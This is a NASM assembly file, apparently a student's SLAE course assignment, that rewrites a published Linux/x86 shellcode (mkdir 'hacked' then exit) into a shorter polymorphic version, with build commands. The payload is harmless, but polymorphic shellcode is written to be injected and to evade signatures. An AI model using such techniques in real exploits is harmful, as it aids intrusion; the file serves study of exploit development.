; Title 	: SLAE Linux/x86 - Assignment-6.3
; Description	: Polymorphic version of Linux/x86 - mkdir() & exit() - 36 bytes by zillion
; Original 	: http://shell-storm.org/shellcode/files/shellcode-542.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 29 Bytes (7 bytes less than the original)
;
; nasm -f elf32 shellcode-542-poly.nasm -o shellcode-542-poly.o
; ld shellcode-542-poly.o -o shellcode-542-poly -z execstack

section .text
global _start
_start:
	
        jmp short get_addr
		string_addr:
		
                	pop ebx
			push 0x27
			pop eax
          		mov cx,0x1ed
             		int 0x80
              	
			mov al,0x1
              		xor ebx,ebx
              		int 0x80
	get_addr:
        	call string_addr
        	fname db "hacked"
